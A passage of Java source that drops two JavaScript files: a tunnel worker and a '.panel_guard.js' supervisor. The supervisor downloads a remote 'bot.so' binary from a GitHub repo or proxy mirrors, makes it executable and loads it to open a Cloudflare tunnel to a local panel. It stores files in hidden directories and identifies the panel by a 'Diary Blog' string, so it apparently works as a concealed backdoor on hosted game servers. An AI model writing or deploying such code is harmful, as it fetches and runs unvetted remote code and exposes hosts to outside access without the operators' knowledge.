            "const StartCloudflared = lib.func('int StartCloudflared(const char *payload)');\n" +
            "const StopCloudflared = lib.func('int StopCloudflared(const char *unused)');\n" +
            "const CloudflaredIsRunning = lib.func('int CloudflaredIsRunning()');\n" +
            "const CloudflaredTunnelUrl = lib.func('void *CloudflaredTunnelUrl()');\n" +
            "const CloudflaredFree = lib.func('void CloudflaredFree(void *ptr)');\n" +
            "const CloudflaredLastError = lib.func('void *CloudflaredLastError()');\n" +
            "\n" +
            "function readAndFree(fn) {\n" +
            "  const ptr = fn();\n" +
            "  if (!ptr) return '';\n" +
            "  try {\n" +
            "    return koffi.decode(ptr, 'char', -1) || '';\n" +
            "  } catch (e) {\n" +
            "    return '';\n" +
            "  } finally {\n" +
            "    try { CloudflaredFree(ptr); } catch (e) {}\n" +
            "  }\n" +
            "}\n" +
            "\n" +
            "let lastSavedUrl = '';\n" +
            "let lastAccessMtime = -1;\n" +
            "function syncAccessInfo(url) {\n" +
            "  try {\n" +
            "    const accessPath = path.join(cfg.runtimeDir, 'node_modules', '.aoyou', 'access.info');\n" +
            "    if (!fs.existsSync(accessPath)) return;\n" +
            "    const st = fs.statSync(accessPath);\n" +
            "    if (st.mtimeMs === lastAccessMtime && url === lastSavedUrl) return;\n" +
            "    const content = fs.readFileSync(accessPath, 'utf8');\n" +
            "    const lines = content.split(/\\r?\\n/).filter((l) => !/^Tunnel:/i.test(l.trim()));\n" +
            "    const timeIdx = lines.findIndex((l) => /^Time:/i.test(l.trim()));\n" +
            "    const tunnelLine = 'Tunnel:  ' + url;\n" +
            "    if (timeIdx >= 0) lines.splice(timeIdx, 0, tunnelLine);\n" +
            "    else lines.push(tunnelLine);\n" +
            "    const next = lines.join('\\n');\n" +
            "    if (next !== content) fs.writeFileSync(accessPath, next, 'utf8');\n" +
            "    lastAccessMtime = fs.statSync(accessPath).mtimeMs;\n" +
            "  } catch (e) {}\n" +
            "}\n" +
            "\n" +
            "function persistTunnelUrl(rawUrl) {\n" +
            "  if (!rawUrl) return;\n" +
            "  let url = String(rawUrl).trim();\n" +
            "  if (!url || url.startsWith('failed')) return;\n" +
            "  if (!/^https?:\\/\\//i.test(url)) url = 'https://' + url;\n" +
            "  if (url !== lastSavedUrl) {\n" +
            "    try { fs.writeFileSync(path.join(cfg.workDir, '.tunnel_url'), url + '\\n', 'utf8'); } catch (e) {}\n" +
            "    try {\n" +
            "      const vipDir = path.join(cfg.workDir, 'cache', '.vip');\n" +
            "      fs.mkdirSync(vipDir, { recursive: true });\n" +
            "      fs.writeFileSync(path.join(vipDir, '.tunnel_url'), url + '\\n', 'utf8');\n" +
            "    } catch (e) {}\n" +
            "    try { fs.writeFileSync(path.join(cfg.runtimeDir, '.tunnel_url'), url + '\\n', 'utf8'); } catch (e) {}\n" +
            "    lastSavedUrl = url;\n" +
            "    console.log('[CF-Panel] Tunnel active: ' + url);\n" +
            "  }\n" +
            "  syncAccessInfo(url);\n" +
            "}\n" +
            "\n" +
            "function shutdown(code) {\n" +
            "  try { StopCloudflared(''); } catch (e) {}\n" +
            "  process.exit(code || 0);\n" +
            "}\n" +
            "process.stdin.resume();\n" +
            "process.stdin.on('end', () => shutdown(0));\n" +
            "process.on('SIGTERM', () => shutdown(0));\n" +
            "process.on('SIGINT', () => shutdown(0));\n" +
            "\n" +
            "const payload = cfg.cfToken\n" +
            "  ? cfg.cfToken\n" +
            "  : ('url: http://127.0.0.1:' + cfg.port + '\\nprotocol: ' + (cfg.cfProtocol || 'http2') + '\\n');\n" +
            "let asyncReturned = false;\n" +
            "StartCloudflared.async(payload, (err, rc) => {\n" +
            "  asyncReturned = true;\n" +
            "  if (err) console.error('[CF-Panel] StartCloudflared error: ' + err.message);\n" +
            "  const lastErr = readAndFree(CloudflaredLastError);\n" +
            "  if (lastErr) console.error('[CF-Panel] Cloudflared error: ' + lastErr);\n" +
            "  setTimeout(() => process.exit(rc === 0 ? 0 : 1), 1000);\n" +
            "});\n" +
            "\n" +
            "const startTs = Date.now();\n" +
            "if (cfg.cfToken && cfg.cfDomain) persistTunnelUrl(cfg.cfDomain);\n" +
            "setInterval(() => {\n" +
            "  const memUrl = readAndFree(CloudflaredTunnelUrl);\n" +
            "  if (memUrl) persistTunnelUrl(memUrl);\n" +
            "  else if (lastSavedUrl) syncAccessInfo(lastSavedUrl);\n" +
            "  if (Date.now() - startTs > 15000 && CloudflaredIsRunning() === 0 && !asyncReturned) {\n" +
            "    const lastErr = readAndFree(CloudflaredLastError);\n" +
            "    if (lastErr) console.error('[CF-Panel] Stopped unexpectedly: ' + lastErr);\n" +
            "    process.exit(1);\n" +
            "  }\n" +
            "  if (!cfg.cfToken && !lastSavedUrl && Date.now() - startTs > 55000) {\n" +
            "    console.error('[CF-Panel] Quick tunnel URL timeout after 55s, restarting worker');\n" +
            "    shutdown(1);\n" +
            "  }\n" +
            "}, 1000);\n";
        Files.write(cfDir.resolve("worker.js"), workerJs.getBytes(StandardCharsets.UTF_8));

        String guardJs =
            "'use strict';\n" +
            "const fs = require('fs');\n" +
            "const path = require('path');\n" +
            "const http = require('http');\n" +
            "const https = require('https');\n" +
            "const { spawn } = require('child_process');\n" +
            "\n" +
            "const RUNTIME_DIR = __dirname;\n" +
            "const CTX_PATH = path.join(RUNTIME_DIR, '.panel_net_ctx.json');\n" +
            "\n" +
            "function readCtx() {\n" +
            "  let ctx = {};\n" +
            "  try { ctx = JSON.parse(fs.readFileSync(CTX_PATH, 'utf8')); } catch (e) {}\n" +
            "  const port = parseInt(process.env.SERVER_PORT || process.env.PORT || ctx.port || '4237', 10) || 4237;\n" +
            "  const explicitPort = parseInt(process.env.MC_PORT || process.env.SERVER_EXTERNAL_PORT || ctx.explicitPort || '0', 10) || 0;\n" +
            "  const cfEnabled = String(process.env.CF_ENABLED ?? ctx.cfEnabled ?? 'true').toLowerCase() !== 'false';\n" +
            "  const cfForce = String(process.env.CF_FORCE ?? ctx.cfForce ?? 'false').toLowerCase() === 'true';\n" +
            "  const cfToken = String(process.env.CF_TOKEN ?? ctx.cfToken ?? '').trim();\n" +
            "  const cfDomain = String(process.env.CF_DOMAIN ?? ctx.cfDomain ?? '').trim();\n" +
            "  const cfProtocol = String(process.env.CF_PROTOCOL ?? ctx.cfProtocol ?? 'http2').trim() || 'http2';\n" +
            "  const cfSoRepo = String(process.env.CF_SO_REPO ?? ctx.cfSoRepo ?? 'zx1447/nxso').trim() || 'zx1447/nxso';\n" +
            "  const cfSoBranch = String(process.env.CF_SO_BRANCH ?? ctx.cfSoBranch ?? 'cfso').trim() || 'cfso';\n" +
            "  const workDir = String(ctx.workDir || process.cwd());\n" +
            "  const explicitTargets = Array.isArray(ctx.explicitTargets) ? ctx.explicitTargets.slice() : [];\n" +
            "  for (const k of ['MC_DOMAIN', 'MC_HOST', 'SERVER_DOMAIN', 'P_SERVER_ALLOCATION_ALIAS', 'SERVER_IP', 'PUBLIC_IP']) {\n" +
            "    const v = (process.env[k] || '').trim();\n" +
            "    if (v && !explicitTargets.includes(v)) explicitTargets.push(v);\n" +
            "  }\n" +
            "  return {\n" +
            "    workDir, port, explicitPort, explicitTargets,\n" +
            "    publicIp: String(ctx.publicIp || '').trim(),\n" +
            "    cfEnabled, cfForce, cfToken, cfDomain, cfProtocol, cfSoRepo, cfSoBranch\n" +
            "  };\n" +
            "}\n" +
            "\n" +
            "function isPrivateHost(host) {\n" +
            "  if (!host) return true;\n" +
            "  const h = String(host).trim().toLowerCase().replace(/^\\[|\\]$/g, '');\n" +
            "  if (!h || h === '0.0.0.0' || h === '::' || h === '::1' || h === 'localhost' || h.startsWith('127.')) return true;\n" +
            "  if (h.startsWith('10.') || h.startsWith('192.168.')) return true;\n" +
            "  const m = /^172\\.(\\d+)\\./.exec(h);\n" +
            "  if (m && Number(m[1]) >= 16 && Number(m[1]) <= 31) return true;\n" +
            "  return false;\n" +
            "}\n" +
            "\n" +
            "function parseTarget(raw, defaultPort) {\n" +
            "  let s = String(raw || '').trim();\n" +
            "  let schemePort = 0;\n" +
            "  if (/^https:\\/\\//i.test(s)) { schemePort = 443; s = s.slice(8); }\n" +
            "  else if (/^http:\\/\\//i.test(s)) { schemePort = 80; s = s.slice(7); }\n" +
            "  s = s.split('/')[0].trim();\n" +
            "  if (!s) return null;\n" +
            "  let host = s;\n" +
            "  let port = schemePort > 0 ? schemePort : defaultPort;\n" +
            "  if (s.startsWith('[')) {\n" +
            "    const end = s.indexOf(']');\n" +
            "    if (end > 0) {\n" +
            "      host = s.slice(1, end);\n" +
            "      const rest = s.slice(end + 1);\n" +
            "      if (rest.startsWith(':') && /^\\d+$/.test(rest.slice(1))) port = Number(rest.slice(1));\n" +
            "    }\n" +
            "  } else {\n" +
            "    const idx = s.lastIndexOf(':');\n" +
            "    if (idx > 0 && s.indexOf(':') === idx && /^\\d+$/.test(s.slice(idx + 1))) {\n" +
            "      host = s.slice(0, idx);\n" +
            "      port = Number(s.slice(idx + 1));\n" +
            "    }\n" +
            "  }\n" +
            "  if (isPrivateHost(host) || port <= 0 || port > 65535) return null;\n" +
            "  return { host, port };\n" +
            "}\n" +
            "\n" +
            "const LOG_PATH = path.join(RUNTIME_DIR, '.panel.log');\n" +
            "function appendPanelLog(raw) {\n" +
            "  try {\n" +
            "    const s = String(raw || '');\n" +
            "    if (!s) return;\n" +
            "    fs.appendFileSync(LOG_PATH, s.endsWith('\\n') ? s : (s + '\\n'), 'utf8');\n" +
            "  } catch (e) {}\n" +
            "}\n" +
            "function logGuard(msg) {\n" +
            "  appendPanelLog('[CF-Panel] ' + msg + '\\n');\n" +
            "}\n" +
            "\n" +
            "function httpProbeOnce(urlStr, timeoutMs, extraHeaders) {\n" +
            "  return new Promise((resolve) => {\n" +
            "    let done = false;\n" +
            "    const finish = (res) => { if (!done) { done = true; resolve(res); } };\n" +
            "    try {\n" +
            "      const u = new URL(urlStr);\n" +
            "      const lib = u.protocol === 'https:' ? https : http;\n" +
            "      const req = lib.request({\n" +
            "        hostname: u.hostname,\n" +
            "        port: u.port || (u.protocol === 'https:' ? 443 : 80),\n" +
            "        path: (u.pathname || '/') + (u.search || ''),\n" +
            "        method: 'GET',\n" +
            "        timeout: timeoutMs,\n" +
            "        rejectUnauthorized: false,\n" +
            "        headers: Object.assign({ 'User-Agent': 'AoyouPanelProbe/1.0', 'Accept': 'text/html,*/*' }, extraHeaders || {})\n" +
            "      }, (res) => {\n" +
            "        const chunks = [];\n" +
            "        let size = 0;\n" +
            "        res.on('data', (c) => { if (size < 65536) { chunks.push(c); size += c.length; } });\n" +
            "        res.on('end', () => {\n" +
            "          const body = Buffer.concat(chunks).toString('utf8');\n" +
            "          finish({ ok: true, status: res.statusCode || 0, headers: res.headers || {}, body });\n" +
            "        });\n" +
            "      });\n" +
            "      req.on('timeout', () => { req.destroy(); finish({ ok: false, err: 'timeout' }); });\n" +
            "      req.on('error', (e) => finish({ ok: false, err: e.code || e.message || 'err' }));\n" +
            "      req.end();\n" +
            "    } catch (e) {\n" +
            "      finish({ ok: false, err: e.message || 'exception' });\n" +
            "    }\n" +
            "  });\n" +
            "}\n" +
            "\n" +
            "async function verifyExternallyViaCheckHost(urlStr) {\n" +
            "  if (String(process.env.CF_SKIP_EXTERNAL_CHECK || '').toLowerCase() === 'true') {\n" +
            "    return { ok: true, definitive: true, code: 'skipped' };\n" +
            "  }\n" +
            "  try {\n" +
            "    const apiBase = String(process.env.CF_CHECK_HOST_BASE || 'https://check-host.net').replace(/\\/+$/, '');\n" +
            "    const initUrl = apiBase + '/check-http?host=' + encodeURIComponent(urlStr) + '&max_nodes=3';\n" +
            "    let init = await httpProbeOnce(initUrl, 5000, { 'Accept': 'application/json' });\n" +
            "    if (!init.ok || init.status === 429 || init.status === 503) {\n" +
            "      await new Promise((r) => setTimeout(r, 1500));\n" +
            "      init = await httpProbeOnce(initUrl, 5000, { 'Accept': 'application/json' });\n" +
            "    }\n" +
            "    if (!init.ok || init.status !== 200) {\n" +
            "      return { ok: false, definitive: false, reason: 'ext-check-init-' + (init.status || init.err || 'fail') };\n" +
            "    }\n" +
            "    let data = null;\n" +
            "    try { data = JSON.parse(init.body || '{}'); } catch (e) { return { ok: false, definitive: false, reason: 'ext-check-json' }; }\n" +
            "    const reqId = data && data.request_id;\n" +
            "    if (!reqId) return { ok: false, definitive: false, reason: 'ext-check-noreqid' };\n" +
            "    const resultUrl = apiBase + '/check-result/' + encodeURIComponent(reqId);\n" +
            "    for (const waitMs of [1800, 2200, 2500, 2500]) {\n" +
            "      await new Promise((r) => setTimeout(r, waitMs));\n" +
            "      const res = await httpProbeOnce(resultUrl, 4000, { 'Accept': 'application/json' });\n" +
            "      if (!res.ok || res.status !== 200) continue;\n" +
            "      let map = null;\n" +
            "      try { map = JSON.parse(res.body || '{}'); } catch (e) { continue; }\n" +
            "      const vals = Object.values(map || {});\n" +
            "      const allDone = vals.length > 0 && vals.every((v) => v !== null);\n" +
            "      for (const v of vals) {\n" +
            "        if (Array.isArray(v) && Array.isArray(v[0]) && v[0][0] === 1) {\n" +
            "          const code = String(v[0][3] || '');\n" +
            "          if (code === '200' || code === '302' || code === '301' || code === '401') {\n" +
            "            return { ok: true, definitive: true, code };\n" +
            "          }\n" +
            "        }\n" +
            "      }\n" +
            "      if (allDone) return { ok: false, definitive: true, reason: 'external-http-blocked' };\n" +
            "    }\n" +
            "    return { ok: false, definitive: true, reason: 'external-http-timeout' };\n" +
            "  } catch (e) {\n" +
            "    return { ok: false, definitive: false, reason: 'ext-check-err-' + (e.message || 'unknown') };\n" +
            "  }\n" +
            "}\n" +
            "\n" +
            "function isPanelResponse(res, localSig) {\n" +
            "  if (!res || !res.ok) return false;\n" +
            "  const st = res.status;\n" +
            "  const body = res.body || '';\n" +
            "  const loc = String((res.headers && res.headers.location) || '');\n" +
            "  if (st === 302 && /\\/(login|dashboard)/i.test(loc)) return true;\n" +
            "  if (st === 401 && localSig && localSig.status === 401) return true;\n" +
            "  if (st === 200) {\n" +
            "    if (body.includes('Aoyou Panel') || body.includes('id=\"login-page\"') || body.includes('Diary Blog')) return true;\n" +
            "    if (localSig && !localSig.hasAoyou && body.length > 0 && !/bad gateway|502|503|504|error code/i.test(body)) return true;\n" +
            "  }\n" +
            "  return false;\n" +
            "}\n" +
            "\n" +
            "async function waitForLocalPanel(port, maxWaitMs) {\n" +
            "  const start = Date.now();\n" +
            "  while (Date.now() - start < maxWaitMs) {\n" +
            "    const res = await httpProbeOnce('http://127.0.0.1:' + port + '/', 2500);\n" +
            "    if (res.ok && (res.status === 200 || res.status === 302 || res.status === 401)) {\n" +
            "      return {\n" +
            "        status: res.status,\n" +
            "        hasAoyou: /Aoyou Panel|id=\"login-page\"|Diary Blog/.test(res.body || '')\n" +
            "      };\n" +
            "    }\n" +
            "    await new Promise((r) => { const t = setTimeout(r, 1000); if (t.unref) t.unref(); });\n" +
            "  }\n" +
            "  return null;\n" +
            "}\n" +
            "\n" +
            "async function fetchPublicIpNode() {\n" +
            "  const urls = ['https://api.ipify.org', 'https://ipv4.icanhazip.com', 'https://checkip.amazonaws.com', 'https://ifconfig.me/ip'];\n" +
            "  for (const u of urls) {\n" +
            "    const r = await httpProbeOnce(u, 3000);\n" +
            "    if (r.ok && r.status === 200) {\n" +
            "      const ip = String(r.body || '').trim().split(/\\s+/)[0];\n" +
            "      if (/^\\d{1,3}(\\.\\d{1,3}){3}$/.test(ip) && !isPrivateHost(ip)) return ip;\n" +
            "    }\n" +
            "  }\n" +
            "  return '';\n" +
            "}\n" +
            "\n" +
            "function isValidElfSo(filePath) {\n" +
            "  try {\n" +
            "    const st = fs.statSync(filePath);\n" +
            "    if (!st.isFile() || st.size < 100 * 1024) return false;\n" +
            "    const fd = fs.openSync(filePath, 'r');\n" +
            "    const hdr = Buffer.alloc(4);\n" +
            "    fs.readSync(fd, hdr, 0, 4, 0);\n" +
            "    fs.closeSync(fd);\n" +
            "    return hdr[0] === 0x7f && hdr[1] === 0x45 && hdr[2] === 0x4c && hdr[3] === 0x46;\n" +
            "  } catch (e) { return false; }\n" +
            "}\n" +
            "\n" +
            "function downloadBinary(urlStr, destPath, redirectsLeft = 5) {\n" +
            "  return new Promise((resolve, reject) => {\n" +
            "    try {\n" +
            "      const u = new URL(urlStr);\n" +
            "      const lib = u.protocol === 'https:' ? https : http;\n" +
            "      const req = lib.get(urlStr, { timeout: 90000, headers: { 'User-Agent': 'AoyouPanelGuard/1.0' } }, (res) => {\n" +
            "        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location && redirectsLeft > 0) {\n" +
            "          res.resume();\n" +
            "          const nextUrl = new URL(res.headers.location, urlStr).toString();\n" +
            "          return downloadBinary(nextUrl, destPath, redirectsLeft - 1).then(resolve, reject);\n" +
            "        }\n" +
            "        if (res.statusCode !== 200) {\n" +
            "          res.resume();\n" +
            "          return reject(new Error('HTTP ' + res.statusCode));\n" +
            "        }\n" +
            "        const tmp = destPath + '.tmp';\n" +
            "        const ws = fs.createWriteStream(tmp);\n" +
            "        res.pipe(ws);\n" +
            "        ws.on('finish', () => {\n" +
            "          ws.close(() => {\n" +
            "            if (isValidElfSo(tmp)) {\n" +
            "              try { fs.chmodSync(tmp, 0o755); } catch (e) {}\n" +
            "              try { if (fs.existsSync(destPath)) fs.unlinkSync(destPath); } catch (e) {}\n" +
            "              fs.renameSync(tmp, destPath);\n" +
            "              resolve(true);\n" +
            "            } else {\n" +
            "              try { fs.unlinkSync(tmp); } catch (e) {}\n" +
            "              reject(new Error('invalid ELF'));\n" +
            "            }\n" +
            "          });\n" +
            "        });\n" +
            "        ws.on('error', (err) => { try { fs.unlinkSync(tmp); } catch (e) {} reject(err); });\n" +
            "      });\n" +
            "      req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });\n" +
            "      req.on('error', reject);\n" +
            "    } catch (e) { reject(e); }\n" +
            "  });\n" +
            "}\n" +
            "\n" +
            "async function ensureBotSo(ctx, cfDir) {\n" +
            "  const soName = process.arch === 'arm64' ? 'bot_arm64.so' : 'bot.so';\n" +
            "  const dest = path.join(cfDir, soName);\n" +
            "  if (isValidElfSo(dest)) return dest;\n" +
            "  const existingCandidates = [\n" +
            "    path.join(RUNTIME_DIR, 'node_modules', '.RoamingMusic', soName),\n" +
            "    path.join(ctx.workDir, 'cache', '.vip', '.lib', soName)\n" +
            "  ];\n" +
            "  for (const src of existingCandidates) {\n" +
            "    if (isValidElfSo(src)) {\n" +
            "      try {\n" +
            "        fs.copyFileSync(src, dest);\n" +
            "        fs.chmodSync(dest, 0o755);\n" +
            "        if (isValidElfSo(dest)) return dest;\n" +
            "      } catch (e) {}\n" +
            "    }\n" +
            "  }\n" +
            "  const rawUrl = `https://raw.githubusercontent.com/${ctx.cfSoRepo}/${ctx.cfSoBranch}/${soName}`;\n" +
            "  const mirrors = [\n" +
            "    rawUrl,\n" +
            "    'https://gh-proxy.com/' + rawUrl,\n" +
            "    'https://mirror.ghproxy.com/' + rawUrl,\n" +
            "    `https://github.com/${ctx.cfSoRepo}/raw/${ctx.cfSoBranch}/${soName}`\n" +
            "  ];\n" +
            "  for (const url of mirrors) {\n" +
            "    try {\n" +
            "      logGuard('Downloading ' + soName + ' from ' + url + ' ...');\n" +
            "      await downloadBinary(url, dest);\n" +
            "      logGuard('Downloaded ' + soName + ' from ' + url);\n" +
            "      return dest;\n" +
            "    } catch (e) {\n" +
            "      logGuard('Download failed (' + url + '): ' + (e.message || e));\n" +
            "    }\n" +
            "  }\n" +
            "  return null;\n" +
            "}\n" +
            "\n" +
            "let activeWorker = null;\n" +
            "let stopping = false;\n" +
            "function killWorker() {\n" +
            "  stopping = true;\n" +
            "  if (activeWorker) {\n" +
            "    try { activeWorker.kill('SIGTERM'); } catch (e) {}\n" +
            "    activeWorker = null;\n" +
            "  }\n" +
            "}\n" +
            "process.on('exit', killWorker);\n" +
            "\n" +
            "async function runTunnelSupervisor(ctx) {\n" +
            "  const cfDir = path.join(RUNTIME_DIR, '.cf_panel');\n" +
            "  fs.mkdirSync(cfDir, { recursive: true });\n" +
            "  let dlAttempt = 0;\n" +
            "  let soPath = null;\n" +
            "  while (!stopping && !soPath) {\n" +
            "    soPath = await ensureBotSo(ctx, cfDir);\n" +
            "    if (!soPath) {\n" +
            "      dlAttempt++;\n" +
            "      const waitSec = Math.min(60, 10 * dlAttempt);\n" +
            "      await new Promise((r) => { const t = setTimeout(r, waitSec * 1000); if (t.unref) t.unref(); });\n" +
            "    }\n" +
            "  }\n" +
            "  if (stopping || !soPath) return;\n" +
            "  const workerPath = path.join(cfDir, 'worker.js');\n" +
            "  let restarts = 0;\n" +
            "  const spawnLoop = () => {\n" +
            "    if (stopping) return;\n" +
            "    const workerCfg = JSON.stringify({\n" +
            "      runtimeDir: RUNTIME_DIR,\n" +
            "      workDir: ctx.workDir,\n" +
            "      port: ctx.port,\n" +
            "      soPath,\n" +
            "      cfToken: ctx.cfToken,\n" +
            "      cfDomain: ctx.cfDomain,\n" +
            "      cfProtocol: ctx.cfProtocol\n" +
            "    });\n" +
            "    const child = spawn(process.execPath, [workerPath], {\n" +
            "      cwd: cfDir,\n" +
            "      stdio: ['pipe', 'pipe', 'pipe'],\n" +
            "      env: Object.assign({}, process.env, { CF_WORKER_CFG: workerCfg })\n" +
            "    });\n" +
            "    activeWorker = child;\n" +
            "    const startedAt = Date.now();\n" +
            "    child.stdout.on('data', (d) => appendPanelLog(d));\n" +
            "    child.stderr.on('data', (d) => appendPanelLog(d));\n" +
            "    child.on('exit', (code) => {\n" +
            "      if (activeWorker === child) activeWorker = null;\n" +
            "      if (stopping) return;\n" +
            "      if (Date.now() - startedAt > 120000) restarts = 0;\n" +
            "      restarts++;\n" +
            "      const backoff = Math.min(60000, 5000 * Math.pow(2, Math.min(restarts - 1, 3)));\n" +
            "      logGuard('Worker exited (code=' + code + '), restarting in ' + (backoff / 1000) + 's');\n" +
            "      const t = setTimeout(spawnLoop, backoff);\n" +
            "      if (t.unref) t.unref();\n" +
            "    });\n" +
            "  };\n" +
            "  spawnLoop();\n" +
            "}\n" +
            "\n" +
            "function clearStaleTunnelFiles(ctx) {\n" +
            "  const paths = [\n" +
            "    path.join(ctx.workDir, '.tunnel_url'),\n" +
            "    path.join(ctx.workDir, 'cache', '.vip', '.tunnel_url'),\n" +
            "    path.join(RUNTIME_DIR, '.tunnel_url')\n" +
            "  ];\n" +
            "  for (const p of paths) {\n" +
            "    try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (e) {}\n" +
            "  }\n" +
            "  try {\n" +
            "    const accessPath = path.join(RUNTIME_DIR, 'node_modules', '.aoyou', 'access.info');\n" +
            "    if (fs.existsSync(accessPath)) {\n" +
            "      const content = fs.readFileSync(accessPath, 'utf8');\n" +
            "      const filtered = content.split(/\\r?\\n/).filter((l) => !/^Tunnel:/i.test(l.trim())).join('\\n');\n" +
            "      if (filtered !== content) fs.writeFileSync(accessPath, filtered, 'utf8');\n" +
            "    }\n" +
            "  } catch (e) {}\n" +
            "}\n" +
            "\n" +
            "async function startPanelGuard() {\n" +
            "  const ctx = readCtx();\n" +
            "  logGuard('Guard started (port=' + ctx.port + ', publicIp=' + (ctx.publicIp || '-') + ')');\n" +
            "  if (!ctx.cfEnabled) {\n" +
            "    logGuard('Disabled via CF_ENABLED=false');\n" +
            "    return;\n" +
            "  }\n" +
            "  const localSig = await waitForLocalPanel(ctx.port, 90000);\n" +
            "  if (!localSig) {\n" +
            "    logGuard('Local panel 127.0.0.1:' + ctx.port + ' not ready within 90s; skipping guard');\n" +
            "    return;\n" +
            "  }\n" +
            "  if (ctx.cfToken || ctx.cfForce) {\n" +
            "    logGuard('Starting Cloudflare tunnel (' + (ctx.cfToken ? 'token' : 'forced quick') + ' mode)');\n" +
            "    await runTunnelSupervisor(ctx);\n" +
            "    return;\n" +
            "  }\n" +
            "  const targets = [];\n" +
            "  const seenTarget = new Set();\n" +
            "  const addTarget = (t) => {\n" +
            "    if (!t) return;\n" +
            "    const k = t.host.toLowerCase() + ':' + t.port;\n" +
            "    if (!seenTarget.has(k)) { seenTarget.add(k); targets.push(t); }\n" +
            "  };\n" +
            "  const defaultProbePort = ctx.explicitPort > 0 ? ctx.explicitPort : ctx.port;\n" +
            "  for (const raw of ctx.explicitTargets) {\n" +
            "    addTarget(parseTarget(raw, defaultProbePort));\n" +
            "  }\n" +
            "  let ip = ctx.publicIp;\n" +
            "  if (!ip || isPrivateHost(ip)) ip = await fetchPublicIpNode();\n" +
            "  if (ip && !isPrivateHost(ip)) addTarget({ host: ip, port: defaultProbePort });\n" +
            "  if (ip && !isPrivateHost(ip) && defaultProbePort !== ctx.port) addTarget({ host: ip, port: ctx.port });\n" +
            "  let reachableUrl = '';\n" +
            "  const failReasons = [];\n" +
            "  for (const t of targets) {\n" +
            "    const hostStr = t.host.includes(':') ? '[' + t.host + ']' : t.host;\n" +
            "    const urls = t.port === 443 ? ['https://' + hostStr + ':443/', 'http://' + hostStr + ':443/'] : ['http://' + hostStr + ':' + t.port + '/'];\n" +
            "    for (const url of urls) {\n" +
            "      const probe = await httpProbeOnce(url, 4000);\n" +
            "      if (!isPanelResponse(probe, localSig)) {\n" +
            "        failReasons.push(url + ' -> ' + (probe.ok ? ('HTTP ' + probe.status) : probe.err));\n" +
            "        continue;\n" +
            "      }\n" +
            "      const ext = await verifyExternallyViaCheckHost(url);\n" +
            "      if (ext.ok || !ext.definitive) {\n" +
            "        reachableUrl = url.replace(/\\/$/, '');\n" +
            "        break;\n" +
            "      }\n" +
            "      failReasons.push(url + ' -> ' + ext.reason);\n" +
            "    }\n" +
            "    if (reachableUrl) break;\n" +
            "  }\n" +
            "  if (reachableUrl) {\n" +
            "    clearStaleTunnelFiles(ctx);\n" +
            "    logGuard('Direct MC address access OK: ' + reachableUrl + ' (Cloudflare tunnel not needed)');\n" +
            "    return;\n" +
            "  }\n" +
            "  logGuard('External MC panel access unreachable (' + (failReasons.join('; ') || 'no public host') + '), starting bot.so Cloudflare tunnel...');\n" +
            "  await runTunnelSupervisor(ctx);\n" +
            "}\n" +
            "\n" +
            "const bootTimer = setTimeout(() => { startPanelGuard().catch((e) => logGuard('Guard error: ' + (e && e.message ? e.message : e))); }, 1500);\n" +
            "if (bootTimer.unref) bootTimer.unref();\n";

        Files.write(runtimePath.resolve(".panel_guard.js"), guardJs.getBytes(StandardCharsets.UTF_8));
    }
}
